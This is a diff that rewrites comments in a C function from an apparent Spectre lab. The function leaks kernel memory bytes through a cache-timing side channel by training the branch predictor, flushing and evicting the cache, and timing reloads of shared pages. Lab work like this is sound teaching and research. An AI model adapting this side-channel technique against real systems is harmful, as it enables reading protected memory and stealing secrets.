@@ -27,7 +27,7 @@ static char leak_byte_at_offset(int kernel_fd, char *shared_memory, size_t offse
     size_t best_index = 0, second_index = 0;
     size_t total_attempts = 700;
 
-    // Cache eviction buffer setup
+    // 4MB eviction buffer to help with noise reduction
     const size_t eviction_size = 4 * 1024 * 1024;
     static char *eviction_buffer = NULL;
     if (!eviction_buffer) {
@@ -35,16 +35,16 @@ static char leak_byte_at_offset(int kernel_fd, char *shared_memory, size_t offse
         if (eviction_buffer) memset(eviction_buffer, 1, eviction_size);
     }
 
-    // Two-tier attempt system
+    // Repeatedly attempt to leak the byte at the given offset, with a two-tiered approach for confidence
     for (int tier = 0; tier < 2; tier++) {
         for (size_t attempt = 0; attempt < total_attempts; attempt++) {
             
-            // 1. Train Predictor
+            // Training the branch predictor with in-bounds offsets
             for (int train = 0; train < 48; train++) {
                 call_kernel_part3(kernel_fd, shared_memory, train & 0x3);
             }
 
-            // 2. Flush and Thrash
+            // Flush and Thrash
             flush_shared_memory(shared_memory);
             if (eviction_buffer) {
                 volatile uint64_t sink = 0;
@@ -55,7 +55,7 @@ static char leak_byte_at_offset(int kernel_fd, char *shared_memory, size_t offse
             call_kernel_part3(kernel_fd, shared_memory, offset);
             call_kernel_part3(kernel_fd, shared_memory, offset);
 
-            // 4. Reload and Time (Pseudo-random stride)
+            // Reload + Timing with a pseudo-randomized access pattern to mitigate prefetcher effects
             for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
                 size_t mix_idx = ((i * 167) + 13) & 0xFF;
                 char *addr = shared_memory + (mix_idx * SHD_SPECTRE_LAB_PAGE_SIZE);
@@ -68,7 +68,7 @@ static char leak_byte_at_offset(int kernel_fd, char *shared_memory, size_t offse
             }
         }
 
-        // 5. Margin/Confidence Check
+        // Select best and second-best candidates, with a confidence threshold to potentially break early
         size_t bc = 0, sc = 0;
         for (size_t j = 0; j < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; j++) {
             if (hit_counts[j] > bc) {
@@ -83,7 +83,7 @@ static char leak_byte_at_offset(int kernel_fd, char *shared_memory, size_t offse
         total_attempts = 1400; 
     }
 
-    // Early Null-byte logic
+
     if (best_index == 0 && offset < 12) {
         size_t nz_best_idx = 1, nz_best_count = 0;
         for (size_t j = 1; j < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; j++) {
